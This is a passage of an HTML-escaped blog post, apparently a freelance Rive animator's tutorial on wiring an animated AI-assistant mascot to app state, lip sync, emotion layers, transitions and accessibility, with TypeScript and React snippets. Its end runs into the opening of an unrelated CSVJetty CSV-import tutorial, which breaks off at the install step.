|                v
|           Rive Runtime
|                |
+---------------&amp;gt;|
v
Animated Mascot
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The important principle is to separate the responsibilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AI backend:&lt;/strong&gt; Processes requests and generates responses.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Application controller:&lt;/strong&gt; Determines the current interaction activity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rive animation system:&lt;/strong&gt; Displays the visual response.&lt;/p&gt;

&lt;p&gt;This separation keeps your character animation independent from whichever AI provider your application uses.&lt;/p&gt;

&lt;p&gt;Whether the backend is powered by OpenAI, Gemini, Claude, or another model, the visual interface can respond through the same normalized activity system.&lt;/p&gt;

&lt;h2&gt;


6. A Simple React Activity Controller
&lt;/h2&gt;

&lt;p&gt;Let's start by defining the possible activities.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;AgentActivity&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;idle&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;listening&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;thinking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;speaking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;success&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now create a small React component that manages the application-side state.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight tsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;AgentActivity&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;idle&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;listening&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;thinking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;speaking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;success&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;AgentDemo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;activity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setActivity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;AgentActivity&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;idle&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;AgentActivity&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;idle&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;listening&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;thinking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;speaking&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;success&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;AI Assistant&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;aria-live&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"polite"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Current activity: &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;activity&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"agent-preview"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="cm"&gt;/* Mount your Rive character here */&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"controls"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;map&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;nextActivity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt;
&lt;span class="na"&gt;key&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;nextActivity&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="na"&gt;onClick&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;setActivity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nextActivity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;nextActivity&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is an application-state demo, not yet a complete Rive integration.&lt;/p&gt;

&lt;p&gt;The next step is to connect &lt;code&gt;activity&lt;/code&gt; to a Rive View Model property through the appropriate React runtime API.&lt;/p&gt;

&lt;p&gt;For example, your Rive project could expose an enum property named &lt;code&gt;activity&lt;/code&gt; with the same six values.&lt;/p&gt;

&lt;p&gt;Your integration would then follow this flow:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;React activity changes
|
v
Update Rive View Model
|
v
Rive State Machine
|
v
Character transitions
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In modern Rive workflows, Data Binding is a useful approach for this connection.&lt;/p&gt;

&lt;p&gt;The exact integration code depends on your chosen runtime version and exported Rive file. See the official Rive runtime documentation for the current API.&lt;/p&gt;

&lt;h2&gt;


7. Making Your AI Assistant Speak Naturally
&lt;/h2&gt;

&lt;p&gt;One of the most interesting challenges in conversational AI animation is lip synchronization.&lt;/p&gt;

&lt;p&gt;A basic speaking animation might repeatedly open and close the character's mouth.&lt;/p&gt;

&lt;p&gt;That can work for a simple chatbot.&lt;/p&gt;

&lt;p&gt;But voice AI products can benefit from more expressive mouth movement.&lt;/p&gt;

&lt;p&gt;There are two common approaches.&lt;/p&gt;

&lt;h3&gt;


Audio-Level Animation
&lt;/h3&gt;

&lt;p&gt;Use the current audio amplitude to influence how much the mouth opens.&lt;/p&gt;

&lt;p&gt;Conceptually:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mouthOpen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;audioLevel&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then provide &lt;code&gt;mouthOpen&lt;/code&gt; to the Rive character.&lt;/p&gt;

&lt;p&gt;The animation system can use this value to control mouth movement.&lt;/p&gt;

&lt;p&gt;This approach is relatively simple, but it doesn't accurately reproduce individual speech sounds.&lt;/p&gt;

&lt;h3&gt;


Viseme-Based Lip Sync
&lt;/h3&gt;

&lt;p&gt;Visemes represent visual mouth shapes associated with speech sounds.&lt;/p&gt;

&lt;p&gt;A speech system capable of providing viseme information can send these values to the animation layer.&lt;/p&gt;

&lt;p&gt;For example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Viseme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Your Rive character could support six simplified mouth shapes.&lt;/p&gt;

&lt;p&gt;As the voice system produces timed viseme data, the animation controller updates the mouth shape accordingly.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Text-to-Speech System
|
v
Timed Viseme Events
|
v
Animation Controller
|
v
Rive Mouth Shapes
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For accurate lip sync, timing matters as much as the mouth shapes themselves.&lt;/p&gt;

&lt;p&gt;Your developer needs to coordinate the animation with actual audio playback rather than assuming that generated text and sound will arrive simultaneously.&lt;/p&gt;

&lt;p&gt;Not every voice API provides viseme events, so the implementation depends on the audio system you're using.&lt;/p&gt;

&lt;h2&gt;


8. Making the Character React to Emotion
&lt;/h2&gt;

&lt;p&gt;An AI assistant doesn't necessarily need a different full-body animation for every response tone.&lt;/p&gt;

&lt;p&gt;Instead, emotion can often be designed as an additional control layer.&lt;/p&gt;

&lt;p&gt;For example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;AgentEmotion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;neutral&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;happy&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;empathetic&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;concerned&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;surprised&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Your activity and emotion controls can work independently.&lt;/p&gt;

&lt;p&gt;Example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Activity: Speaking
Emotion: Happy
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The character speaks with a positive expression.&lt;/p&gt;

&lt;p&gt;Another example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Activity: Listening
Emotion: Concerned
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The character listens attentively with a more serious facial expression.&lt;/p&gt;

&lt;p&gt;This modular approach can reduce duplicated animation work.&lt;/p&gt;

&lt;p&gt;However, avoid assuming that an AI model's tone classification perfectly represents the user's emotional state.&lt;/p&gt;

&lt;p&gt;Use expressions conservatively, especially in sensitive applications such as healthcare, financial assistance, or mental health support.&lt;/p&gt;

&lt;h2&gt;


9. Designing Transitions That Don't Break
&lt;/h2&gt;

&lt;p&gt;This is where interactive animation becomes a real engineering problem.&lt;/p&gt;

&lt;p&gt;Consider the following situation:&lt;/p&gt;

&lt;p&gt;Your character is speaking.&lt;/p&gt;

&lt;p&gt;The user interrupts.&lt;/p&gt;

&lt;p&gt;Your application immediately switches to listening.&lt;/p&gt;

&lt;p&gt;What should happen to the character's mouth, hands, and facial expression?&lt;/p&gt;

&lt;p&gt;If the animation system isn't designed carefully, you might see:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A mouth frozen open&lt;/li&gt;
&lt;li&gt;Sudden head movement&lt;/li&gt;
&lt;li&gt;Hands snapping into the wrong pose&lt;/li&gt;
&lt;li&gt;Conflicting animations&lt;/li&gt;
&lt;li&gt;Unexpected idle transitions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The solution is to define clear transition rules and ownership of animation properties.&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Transition&lt;/th&gt;
&lt;th&gt;Expected Behavior&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Idle → Listening&lt;/td&gt;
&lt;td&gt;Smooth attentive movement&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Listening → Thinking&lt;/td&gt;
&lt;td&gt;Gradual pose transition&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Thinking → Speaking&lt;/td&gt;
&lt;td&gt;Begin speaking posture&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Speaking → Listening&lt;/td&gt;
&lt;td&gt;Stop lip sync and reset mouth&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Any state → Error&lt;/td&gt;
&lt;td&gt;Interrupt safely&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Success → Idle&lt;/td&gt;
&lt;td&gt;Complete reaction, return to rest&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;For some characters, a single activity enum is sufficient.&lt;/p&gt;

&lt;p&gt;For more advanced systems, separate layers for body movement, facial expressions, and mouth animation may provide greater flexibility.&lt;/p&gt;

&lt;p&gt;The best architecture depends on the character and product requirements.&lt;/p&gt;

&lt;h2&gt;


10. Don't Forget Performance and Accessibility
&lt;/h2&gt;

&lt;p&gt;An animated AI assistant should improve the experience, not make the application harder to use.&lt;/p&gt;

&lt;p&gt;Before shipping, consider the following.&lt;/p&gt;

&lt;h3&gt;


Performance
&lt;/h3&gt;

&lt;p&gt;Keep artwork and animation systems as efficient as possible.&lt;/p&gt;

&lt;p&gt;Test your Rive file on the actual devices and browsers your users will use.&lt;/p&gt;

&lt;p&gt;Pay attention to unnecessary redraws, heavy assets, and complex layered animations.&lt;/p&gt;

&lt;h3&gt;


Reduced Motion
&lt;/h3&gt;

&lt;p&gt;Respect users who prefer reduced motion.&lt;/p&gt;

&lt;p&gt;Your application should offer a calmer version of the character or a static alternative when appropriate.&lt;/p&gt;

&lt;h3&gt;


Accessibility
&lt;/h3&gt;

&lt;p&gt;Animation alone shouldn't communicate critical information.&lt;/p&gt;

&lt;p&gt;If the agent is listening, thinking, or reporting an error, provide accessible status information as well.&lt;/p&gt;

&lt;p&gt;For example, use appropriate status messages for screen-reader users without announcing every decorative animation transition.&lt;/p&gt;

&lt;h3&gt;


User Control
&lt;/h3&gt;

&lt;p&gt;Allow users to minimize or disable the animated assistant.&lt;/p&gt;

&lt;p&gt;A helpful mascot shouldn't become an obstacle.&lt;/p&gt;

&lt;h2&gt;


11. Where Animated AI Assistants Make Sense
&lt;/h2&gt;

&lt;p&gt;Interactive AI characters aren't appropriate for every product.&lt;/p&gt;

&lt;p&gt;But they can be particularly useful when the application benefits from ongoing visual communication.&lt;/p&gt;

&lt;p&gt;Potential use cases include:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AI coaching platforms:&lt;/strong&gt; A companion that welcomes users, listens, and provides encouragement.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Language learning applications:&lt;/strong&gt; A speaking character with expressive mouth movement and positive feedback.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Voice AI interfaces:&lt;/strong&gt; A visual indicator for listening, thinking, and speaking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Educational applications:&lt;/strong&gt; Interactive tutors that guide students through tasks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Product onboarding:&lt;/strong&gt; Friendly characters that explain features and celebrate completed steps.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Virtual pets and gamified apps:&lt;/strong&gt; Characters that reflect progress, rewards, and activity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Customer support interfaces:&lt;/strong&gt; An optional visual assistant that communicates its current activity.&lt;/p&gt;

&lt;p&gt;In each case, the design should be driven by the user's needs rather than adding a mascot simply because it's visually appealing.&lt;/p&gt;

&lt;h2&gt;


12. How I Approach Rive AI Mascot Projects
&lt;/h2&gt;

&lt;p&gt;As a freelance Rive animator, I focus on building interactive character systems that designers and developers can actually use in production.&lt;/p&gt;

&lt;p&gt;For AI companion projects, my workflow generally includes:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Understanding the application's interactions and required character behaviors.&lt;/li&gt;
&lt;li&gt;Planning the character rig and animation states.&lt;/li&gt;
&lt;li&gt;Building expressive idle, listening, thinking, speaking, and reaction animations.&lt;/li&gt;
&lt;li&gt;Creating and testing the state machine.&lt;/li&gt;
&lt;li&gt;Defining runtime-facing inputs or Data Binding properties.&lt;/li&gt;
&lt;li&gt;Testing transitions, interruption behavior, and animation loops.&lt;/li&gt;
&lt;li&gt;Delivering the Rive assets with clear integration guidance.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For more advanced projects, this can also include lip-sync mouth shapes, audio-reactive animation, gaze tracking, emotions, and reusable character systems.&lt;/p&gt;

&lt;p&gt;The goal is to create something that looks good but also behaves reliably inside the application.&lt;/p&gt;




&lt;h2&gt;


Final Thoughts: Give Your AI Agent a Better Interface
&lt;/h2&gt;

&lt;p&gt;AI agents are becoming increasingly capable.&lt;/p&gt;

&lt;p&gt;But the interface connecting those systems to users still matters.&lt;/p&gt;

&lt;p&gt;A thoughtfully animated character can make an AI product feel more responsive, approachable, and easier to understand.&lt;/p&gt;

&lt;p&gt;It doesn't need exaggerated expressions or constant movement.&lt;/p&gt;

&lt;p&gt;Sometimes a natural blink, an attentive listening pose, or a smooth transition into speaking is enough.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The best AI mascot isn't the one that moves the most. It's the one that communicates the right thing at the right moment.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And with tools like Rive, these experiences can become part of a real web application's interaction system rather than remaining a decorative animation.&lt;/p&gt;




&lt;h2&gt;


Need an Interactive Rive Animator for Your AI Project?
&lt;/h2&gt;

&lt;p&gt;I'm &lt;strong&gt;Praneeth Kawya Thathsara&lt;/strong&gt;, a freelance Rive animator specializing in interactive mascots, AI character animation, state machines, lip sync, and developer-ready animation systems.&lt;/p&gt;

&lt;p&gt;I work with startups, designers, and development teams building interactive experiences for websites, mobile applications, and AI-powered products.&lt;/p&gt;

&lt;p&gt;If you're creating an AI agent, voice assistant, AI coach, or interactive mascot, I'd be happy to help bring the character to life.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Explore my work:&lt;/strong&gt; &lt;a href="https://riveanimator.com/" rel="noopener noreferrer"&gt;RiveAnimator.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Interactive AI mascot services:&lt;/strong&gt; &lt;a href="https://mascotengine.com/" rel="noopener noreferrer"&gt;MascotEngine.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;a href="mailto:riveanimator@gmail.com"&gt;riveanimator@gmail.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Let's build an AI character that doesn't just animate — it interacts.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A CSV parser gives you rows. A customer-facing import feature needs a few more decisions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;What if the customer's headers don't match your database fields?&lt;/li&gt;
&lt;li&gt;What if a required email address is missing?&lt;/li&gt;
&lt;li&gt;Can users correct mistakes without editing and uploading the file again?&lt;/li&gt;
&lt;li&gt;How do the finished records reach your backend?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I built &lt;a href="https://www.csvjetty.com/?utm_source=dev.to&amp;amp;utm_medium=referral&amp;amp;utm_campaign=react_csv_import_tutorial&amp;amp;utm_content=intro"&gt;CSVJetty&lt;/a&gt; to handle that workflow. This tutorial shows how to add it to a React app and receive the imported records.&lt;/p&gt;

&lt;h2&gt;


What we're building
&lt;/h2&gt;

&lt;p&gt;A contact importer with three fields:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First name: required&lt;/li&gt;
&lt;li&gt;Last name: optional&lt;/li&gt;
&lt;li&gt;Email: required and validated&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Users upload a CSV, review the column mappings, correct invalid values, and submit the records.&lt;/p&gt;

&lt;p&gt;We'll use callback delivery. CSVJetty processes the CSV in the browser and passes the imported rows to your application without routing row data through CSVJetty's servers. The service still receives import metadata.&lt;/p&gt;

&lt;h2&gt;


1. Install the package
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install &lt;/span&gt;csvjetty
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



